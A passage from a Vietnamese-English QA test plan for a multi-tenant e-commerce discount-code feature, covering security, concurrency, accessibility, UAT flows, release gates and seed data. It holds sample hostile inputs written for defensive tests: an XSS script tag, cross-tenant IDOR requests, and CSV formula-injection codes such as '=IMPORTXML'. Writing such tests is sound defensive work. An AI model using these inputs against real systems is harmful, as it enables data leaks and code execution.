| **TC-F33-08-06** | `AC-4 US-F33-08` | `[Positive]` | Search by order # → filter đúng | 1. Search `#1001`. | - Row có order=#1001 hiện duy nhất. | Medium | [x] |
| **TC-F33-08-07** | `AC-5 US-F33-08`, `BR-07` | `[Security]` | Immutable: PATCH/DELETE history row → 403 hoặc nút disabled | 1. Admin click row → mở chi tiết.<br>2. Tìm nút Edit/Delete.<br>3. Gọi PATCH/DELETE API trực tiếp. | - Nút Edit/Delete disabled hoặc hidden.<br>- API PATCH `/api/collections/discount-usage-history/:id` → 403.<br>- API DELETE → 403.<br>- Message: `"Usage history is immutable for audit purposes"`. | Blocker | [x] |

---

### NHÓM 09 — Security, Concurrency & Cross-cutting (12 TCs)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-09-01** | Security, IDOR | `[Security]` | Tenant A gọi PATCH discount của tenant B → 403 | 1. Tenant A user.<br>2. PATCH `/api/collections/discounts/<idB>` body `{ value: 99 }`. | - HTTP 403 Forbidden.<br>- Discount tenant B KHÔNG thay đổi.<br>- Audit log record attempt. | Blocker | [x] |
| **TC-F33-09-02** | Security, IDOR | `[Security]` | Tenant A gọi DELETE discount tenant B → 403 | 1. Tenant A DELETE `/api/collections/discounts/<idB>`. | - HTTP 403.<br>- Discount B vẫn còn. | Blocker | [x] |
| **TC-F33-09-03** | Security, IDOR | `[Security]` | Tenant A GET history row của tenant B → 403/404 | 1. Tenant A GET `/api/collections/discount-usage-history/<idB-row>`. | - HTTP 403 hoặc 404 (không leak existence).<br>- Không trả data. | Blocker | [x] |
| **TC-F33-09-04** | `BR-08`, Concurrency | `[Concurrency]` | Race 2 buyer khi còn 1 lượt → chỉ 1 thành công, 1 silent reject | 1. Discount `LAST1` `usageCount=9, usageLimit=10`.<br>2. `Promise.all([checkout(buyer1, 'LAST1'), checkout(buyer2, 'LAST1')])`.<br>3. Query DB. | - Đúng **1 order** có `discountAmount > 0`.<br>- Order còn lại `discountAmount=0` (silent reject).<br>- `usageCount === 10` (không 11).<br>- Đúng **1 row** trong history. | Blocker | [ ] |
| **TC-F33-09-05** | `BR-04`, Concurrency | `[Concurrency]` | Tạo cùng code đồng thời cùng tenant → 1 thành công, 1 reject | 1. Tenant A: `Promise.all([create('NEW'), create('NEW')])` đồng thời.<br>2. Query DB. | - Đúng 1 record `NEW` tồn tại.<br>- Request thứ 2 nhận error unique constraint.<br>- DB unique index `(tenant_id, code)` đảm bảo. | High | [ ] |
| **TC-F33-09-06** | `BR-08`, Atomicity | `[Concurrency]` | Insert history fail → rollback luôn usageCount increment | 1. Mock `discount_usage_history.insert` throw error.<br>2. Place order với discount valid.<br>3. Query DB. | - Order rollback hoặc retry.<br>- `usageCount` KHÔNG tăng.<br>- Không có half-commit state. | Blocker | [ ] |
| **TC-F33-09-07** | Security, XSS | `[Security]` | Description chứa `<script>` → render escape ở admin | 1. Tạo discount description = `<script>alert(1)</script>`.<br>2. Mở list/edit view trong admin. | - Text render escape (`&lt;script&gt;...`).<br>- Không execute JS.<br>- Không có alert dialog. | High | [x] |
| **TC-F33-09-08** | Security, CSRF | `[Security]` | POST tạo discount thiếu CSRF token → 403 | 1. Gửi POST `/api/collections/discounts` không kèm CSRF token.<br>2. Check response. | - HTTP 403.<br>- Không tạo record. | High | [x] |
| **TC-F33-09-09** | Cross-cutting, A11y | `[A11y]` | WCAG 2.1 AA: error message link aria-describedby | 1. Submit form invalid (percentage=150).<br>2. Inspect DOM. | - Field `value` có `aria-invalid="true"`.<br>- `aria-describedby` trỏ tới error message element.<br>- Status badge có text label, không chỉ color. | Medium | [ ] |
| **TC-F33-09-10** | Cross-cutting, Responsive | `[UI]` | S3 mobile checkout: input + Apply stack cleanly trên 375px | 1. iPhone 14 Pro viewport.<br>2. Vào checkout, quan sát discount field. | - Input đầy đủ width, button Apply xuống dòng dưới (stack).<br>- Discount line legible (không overflow).<br>- Touch target ≥ 44px. | High | [x] |
| **TC-F33-09-11** | Cross-cutting, i18n | `[Localization]` | Storefront S3 honor locale `ms`: button text "Apply" → "Mohon" | 1. Site `Sites.locale='ms'`.<br>2. Vào checkout.<br>3. Inspect text discount panel. | - Label + button text dịch BM.<br>- Currency vẫn RM, dates Asia/Kuala_Lumpur. | Medium | [x] |
| **TC-F33-09-12** | Perf, SLA | `[Perf]` | API checkout với discount apply < 800ms P95 | 1. Run k6 50 VU × 1 min với apply discount.<br>2. Inspect P95 latency. | - P95 < 800ms.<br>- P99 < 1500ms.<br>- Không có 5xx. | High | [ ] |

---

### NHÓM 10 — Spec Coverage Supplements (20 TCs)

> **Mục đích:** Đóng gap sau audit spec coverage (PRD + Stories + Design) — cover các UI states, timezone normalization, site scoping, idempotency, race condition, edge case finalAmount, accessibility.

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F33-10-01** | Design §6 S2 normalization | `[Logic]` | startsAt nhập "01 Jun 2026" → DB lưu start-of-day Asia/Kuala_Lumpur | 1. Form create discount, startsAt = `2026-06-01`.<br>2. Save.<br>3. Query DB raw timestamp. | - DB lưu `startsAt = 2026-06-01T00:00:00+08:00` (UTC+8).<br>- Không phải UTC midnight hoặc local browser TZ. | High | [x] |
| **TC-F33-10-02** | Design §6 S2 normalization | `[Logic]` | expiresAt nhập "31 Aug 2026" → DB lưu end-of-day Asia/Kuala_Lumpur | 1. expiresAt = `2026-08-31`.<br>2. Save. | - DB lưu `expiresAt = 2026-08-31T23:59:59+08:00`.<br>- Discount valid đến 23:59:59 KL time. | High | [x] |
| **TC-F33-10-03** | Design §6 S3 "Confirmation parity" | `[UI]` | Discount line hiện đồng nhất ở summary, payment step, email | 1. Apply `SUMMER50` ở checkout.<br>2. Chụp screenshot summary panel.<br>3. Tiếp tục sang payment step → screenshot.<br>4. Place order → inspect email. | - Cả 3 surface đều show `Discount: −RM 50.00`.<br>- Format đồng nhất (cùng currency, cùng dấu, cùng spacing).<br>- Không có chỗ nào ẩn dòng discount. | Blocker | [x] |
| **TC-F33-10-04** | PRD §9 `discounts.site` | `[Positive]` | site=null → discount apply trên TẤT CẢ site của tenant | 1. Tenant A có 2 sites (S1, S2).<br>2. Tạo discount `ALLSITES` site=null.<br>3. Customer checkout từ S1 apply `ALLSITES`.<br>4. Customer khác checkout từ S2 apply `ALLSITES`. | - Cả 2 checkout đều apply thành công.<br>- discountAmount > 0 ở cả 2 order. | High | [x] |
| **TC-F33-10-05** | PRD §9 `discounts.site` | `[Positive]` | site=S1 → discount CHỈ apply trên S1 | 1. Discount `ONLYS1` site=S1.<br>2. Customer checkout từ S1 → apply.<br>3. Customer checkout từ S2 → apply. | - S1 checkout: discountAmount > 0.<br>- S2 checkout: silent reject (discountAmount = 0). | High | [x] |
| **TC-F33-10-06** | `BR-08`, US-F33-06 Additional | `[Negative]` | Customer apply discount nhưng KHÔNG place order → usageCount KHÔNG tăng | 1. Discount `BROWSE50` usageCount=5.<br>2. Customer apply ở checkout.<br>3. Customer đóng browser/abandon (KHÔNG submit order).<br>4. Wait 1 min, query DB. | - `usageCount` vẫn = 5.<br>- Không có row mới trong history.<br>- Discount hook chỉ trigger khi `order.status = paid/placed`. | Blocker | [x] |
| **TC-F33-10-07** | `FR-12`, US-F33-06 | `[Concurrency]` | COD/QR checkout idempotency: retry POST cùng idempotency key → KHÔNG duplicate order | 1. POST `/api/orders/checkout` với `Idempotency-Key: abc123` + discount.<br>2. Network retry/dup gọi cùng key.<br>3. Query DB. | - Chỉ 1 order tạo (cùng id).<br>- `usageCount` chỉ tăng 1.<br>- 1 history row duy nhất.<br>- Response 2nd call: cùng order data (200) hoặc 409 Conflict. | Blocker | [x] |
| **TC-F33-10-08** | `BR-02` edge, AC-3 US-F33-06 | `[Edge]` | Discount = full subtotal → finalAmount = shipping + tax | 1. Subtotal=10000, shipping=1000, tax=660.<br>2. Apply fixed discount value=10000 (100% off subtotal).<br>3. Place order. | - discountAmount=10000.<br>- finalAmount = 0 + 1000 + 660 = **1660 sen**.<br>- Order tạo thành công.<br>- Stripe (nếu chọn) charge 1660 sen. | High | [x] |
| **TC-F33-10-09** | Design §6 S1 "States" | `[UI]` | List loading skeleton hiển thị trước khi data fetch xong | 1. Slow network throttle.<br>2. Vào Discounts list.<br>3. Quan sát skeleton trước khi data load. | - Skeleton rows hiển thị 200-500ms.<br>- Không có spinner blocking.<br>- Skeleton replace bằng data khi fetched. | Medium | [x] |
| **TC-F33-10-10** | Design §6 S1 "States" | `[UI]` | Empty state "No discount codes yet" + Create CTA hiển thị | 1. Tenant fresh, 0 discount.<br>2. Vào Discounts list. | - Hiển thị: `"No discount codes yet"`.<br>- Nút `[+ Create]` CTA visible.<br>- Không có row, không có error. | Medium | [x] |
| **TC-F33-10-11** | Design §6 S2 fields | `[UI]` | Fixed type → field Value hiển thị unit helper "sen = RM X.XX" | 1. Open create form.<br>2. Chọn Type=Fixed.<br>3. Nhập value=`2500`. | - Hint hoặc helper: `"2500 sen = RM 25.00"` hiện kèm input.<br>- Khi Type=Percentage: hint = `"%"` (0-100). | Medium | [x] |
| **TC-F33-10-12** | Design §6 S2 Modes | `[UI]` | Create mode ẨN field usageCount; Edit mode HIỆN read-only | 1. Open create form → inspect DOM.<br>2. Open edit form discount đã có → inspect DOM. | - Create: field usageCount không có hoặc hidden.<br>- Edit: field usageCount hiện với `readonly` hoặc `disabled`, giá trị đúng. | Medium | [x] |
| **TC-F33-10-13** | Design §6 S3 "States" | `[UI]` | Apply button → spinner state khi đang validating | 1. Slow network.<br>2. Nhập code, click `[Apply]`. | - Button hiển thị spinner / loading state.<br>- Button disabled cho đến khi response.<br>- Không cho click double trong khi đợi. | Medium | [x] |
| **TC-F33-10-14** | Design §6 S4 "States" | `[UI]` | History empty state "No redemptions yet" | 1. Tenant fresh 0 history rows.<br>2. Vào Discount Usage History. | - Message: `"No redemptions yet"`.<br>- Không có row trong table. | Low | [x] |
| **TC-F33-10-15** | Design §6 S4 columns | `[Positive]` | Order # cell là link → mở F10 order detail | 1. Click cell `#1001` trong row history.<br>2. Inspect URL. | - URL navigate tới F10 order detail (e.g. `/admin/orders/1001`).<br>- Không 404. | Medium | [x] |
| **TC-F33-10-16** | PRD §9 data model | `[Negative]` | usageLimit = 0 → reject (min 1) | 1. Create form, usageLimit=`0`.<br>2. Save. | - Error: `"Usage limit must be at least 1 (or leave blank for unlimited)"`.<br>- Không lưu DB. | Medium | [x] |
| **TC-F33-10-17** | PRD §9 data model | `[Positive]` | usageLimit blank → DB lưu null (unlimited) | 1. Create form, usageLimit để trống.<br>2. Save.<br>3. Query DB. | - DB `usageLimit = NULL`.<br>- List view hiển thị `∞ unlimited`. | Medium | [x] |
| **TC-F33-10-18** | Concurrency, BR-08 | `[Concurrency]` | Race: admin set status=inactive khi customer đang apply → silent reject ở place order | 1. Customer apply `RACECODE` thành công ở step 1 (chip applied).<br>2. Admin PATCH discount status=inactive.<br>3. Customer click `[Place Order]`. | - Place order success.<br>- finalAmount = giá full (silent reject ở back-end final check).<br>- discountAmount=0.<br>- usageCount không tăng. | High | [x] |
| **TC-F33-10-19** | FR-15 | `[Edge]` | Super-admin export KHÔNG kèm ?tenantId → behavior chính thức | 1. Super-admin login.<br>2. `GET /api/v1/discounts/export` không có query. | - Định: trả ALL tenants (super power) HOẶC 400 yêu cầu tenantId.<br>- Confirm với BA: behavior nào.<br>- Test verify chính xác. | Medium | [x] |
| **TC-F33-10-20** | Design §4.1, §7 A11y | `[A11y]` | Status badge có text label + color (không chỉ color) | 1. Inspect badge active row.<br>2. Inspect badge inactive row. | - Active badge: text `"Active"` + green bg.<br>- Inactive: text `"Inactive"` + slate bg.<br>- Contrast ratio ≥ 4.5:1 (WCAG AA).<br>- aria-label đúng. | Medium | [x] |

---

## 5. Hành trình Trải nghiệm End-to-End (E2E UAT Flow)

_Mô tả 3 kịch bản tổng thể qua các vai trò chính._

### Kịch bản E2E 1 — Merchant tạo và quản lý discount
1. **Login Payload admin** với tenant owner credentials.
2. **Navigate Discounts** → click `[Create]` → fill form `SUMMER50` percentage 50%, limit 10, dates 2026-06-01..2026-08-31 → save.
3. **Verify list view** hiển thị row với progress bar 0/10 màu mặc định.
4. **Search/Filter** test combo `SUMMER` + Status=Active → row hiện đúng.
5. **Edit discount** → đổi limit từ 10 → 20 → save → verify list update.
6. **Export CSV** → mở file, verify 9 columns + dates ISO 8601.
7. **Delete discount** → confirm dialog → verify row biến mất, history rows nếu có vẫn còn.

### Kịch bản E2E 2 — Customer apply discount qua 3 gateway
1. **Browse storefront** tenant A, add 2 sản phẩm vào cart (subtotal RM100).
2. **Checkout COD** → apply `SUMMER50` → verify total RM66.60 → place order success.
3. **Email receipt** check có dòng `Discount: −RM50.00`.
4. **Verify DB**: `usageCount=1`, 1 history row, `order.discountAmount=5000`.
5. **Repeat checkout QR** với cart tương tự → verify parity (cùng finalAmount RM66.60).
6. **Repeat checkout Stripe** → verify session.amount_total=6660 sen → complete payment → webhook idempotent.
7. **Edge case**: apply code `EXPIRED` → verify silent reject, order tạo full price, không có history mới.

### Kịch bản E2E 3 — Audit & reporting
1. **Login merchant**, navigate Discount Usage History.
2. **Verify columns** + sorted by date desc.
3. **Tenant isolation**: switch sang tenant B → KHÔNG thấy history tenant A.
4. **Search by code + order** → filter chính xác.
5. **Attempt edit history row** → verify disabled hoặc 403.
6. **Super-admin** mode → xem toàn bộ tenant.
7. **Bulk export CSV** discount list super-admin với `?tenantId=A` → verify scope.

---

## 6. Tiêu chí Đánh giá Chất lượng Phát hành (Quality Gates)

| Nhóm Kiểm thử | Trạng thái | Ghi chú |
|---|---|---|
| **1. Admin CRUD** (NHÓM 01-04) | [ ] Đã chạy 0/31 TC | Coverage TC create/edit/delete/list, tập trung BVA percentage 0/100, code uniqueness per tenant. |
| **2. Checkout Apply COD/QR/Stripe** (NHÓM 06-07) | [ ] Đã chạy 0/24 TC | **Blocker**: gateway parity TC-F33-07-09, atomic redeem TC-F33-06-13, webhook idempotent TC-F33-07-07. |
| **3. Silent Reject 4 cases** | [ ] Đã chạy 0/4 TC | TC-F33-06-07/08/09/10 — bắt buộc PASS trước go-live. KHÔNG được hard-fail checkout. |
| **4. CSV Export & Security** (NHÓM 05 + 09) | [ ] Đã chạy 0/20 TC | Formula injection guard (TC-F33-05-09/10), tenant scope (TC-F33-05-04), cap 10k (TC-F33-05-08), IDOR (TC-F33-09-01/02/03). |
| **5. Usage History Immutable** (NHÓM 08) | [ ] Đã chạy 0/7 TC | TC-F33-08-07 audit trail. TC-F33-03-03 delete discount preserve history. |
| **6. Concurrency** | [ ] Đã chạy 0/3 TC | TC-F33-09-04/05/06 — race condition, atomic rollback. Cần load test setup. |
| **7. Performance SLA** | [ ] Not Run | TC-F33-09-12 checkout P95 < 800ms. CSV export < 5s cho 10k rows. |
| **8. E2E UAT** | [ ] Not Run | 3 kịch bản end-to-end ở mục 5. P0/P1 phải PASS trước release. |
| **9. UI States & Coverage Supplements** (NHÓM 10) | [ ] Đã chạy 0/20 TC | Đóng gap spec: TZ Asia/KL, S1-S4 states, site scoping, idempotency, race admin-status, WCAG A11y. **Blocker**: TC-F33-10-03 (parity), 10-06 (abandon), 10-07 (idempotency). |

> **Khuyến nghị Release:** Block release nếu BẤT KỲ Blocker TC nào fail. Cần đặc biệt verify:
> - Gateway parity (cùng finalAmount cho COD/QR/Stripe).
> - Silent reject KHÔNG bao giờ làm fail checkout.
> - Webhook Stripe idempotent (replay không tạo duplicate).
> - CSV export tenant-scoped + formula injection guard.
> - Race condition không cho phép overuse at-limit code.

---

## 7. Traceability Matrix (Story → TC)

| Story | TC IDs | Total |
|---|---|---|
| US-F33-01 | TC-F33-01-01 → TC-F33-01-12 | 12 |
| US-F33-02 | TC-F33-02-01 → TC-F33-02-07 | 7 |
| US-F33-03 | TC-F33-03-01 → TC-F33-03-04 | 4 |
| US-F33-04 | TC-F33-04-01 → TC-F33-04-08 | 8 |
| US-F33-05 | TC-F33-05-01 → TC-F33-05-12 | 12 |
| US-F33-06 | TC-F33-06-01 → TC-F33-06-14 | 14 |
| US-F33-07 | TC-F33-07-01 → TC-F33-07-10 | 10 |
| US-F33-08 | TC-F33-08-01 → TC-F33-08-07 | 7 |
| Cross-cutting | TC-F33-09-01 → TC-F33-09-12 | 12 |
| Spec Coverage Supplements | TC-F33-10-01 → TC-F33-10-20 | 20 |
| **TỔNG** | | **106** |

---

## 8. Test Data Seed Reference

**File:** `scripts/seed-f33-test-fixtures.ts` (proposed)

```typescript
const seedDiscounts = [
  { tenant: tA, code: 'SUMMER50',  type: 'percentage', value: 50,   status: 'active',   usageLimit: 10,   usageCount: 3 },
  { tenant: tA, code: 'WELCOME',   type: 'fixed',      value: 2500, status: 'active',   usageLimit: 100,  usageCount: 100 }, // at-limit
  { tenant: tA, code: 'OLD2025',   type: 'percentage', value: 10,   status: 'inactive', usageLimit: null, usageCount: 8 },
  { tenant: tA, code: 'EXPIRED',   type: 'percentage', value: 20,   status: 'active',   expiresAt: '2025-01-01' },
  { tenant: tA, code: 'FUTURE',    type: 'percentage', value: 15,   status: 'active',   startsAt: '2027-01-01' },
  { tenant: tA, code: 'UNLIMITED', type: 'percentage', value: 5,    status: 'active',   usageLimit: null },
  { tenant: tB, code: 'SUMMER50',  type: 'fixed',      value: 1000, status: 'active' }, // cross-tenant collision test
  // Formula injection guard test
  { tenant: tA, code: '=IMPORTXML', type: 'percentage', value: 5, status: 'active' },
  { tenant: tA, code: '+CMD',       type: 'percentage', value: 5, status: 'active' },
  { tenant: tA, code: '-SUM',       type: 'percentage', value: 5, status: 'active' },
  { tenant: tA, code: '@PHISH',     type: 'percentage', value: 5, status: 'active' },
];
```

---

## 9. Câu hỏi mở / Risks cần BA & Dev confirm

| # | Câu hỏi | Owner |
|---|---------|-------|
| Q1 | Cap `discountAmount` khi > subtotal: behavior chính thức là cap, hay reject toàn bộ discount? (TC-F33-06-06) | BA + Dev |
| Q2 | Race lock strategy: `SELECT FOR UPDATE` hay atomic SQL UPDATE với guard `WHERE usageCount < usageLimit`? (TC-F33-09-04) | Dev BE |
| Q3 | Stripe rounding với discount % không chia hết sen (33%, 17%) — line items có thể off-by-1, cần round logic chính thức (TC-F33-07-04) | Dev BE |
| Q4 | GDPR right-to-erasure vs `customerEmail` snapshot trong history: hash, scrub, hay giữ nguyên với consent? | BA + Legal |
| Q5 | 10k row cap có chặn merchant lớn? Nâng cap hay bắt buộc date filter? (TC-F33-05-08) | BA |
| Q6 | Formula injection charset: chỉ `= + - @` hay mở rộng `\t \r`? (TC-F33-05-10) | Security |

---

**End of Test Plan F33**
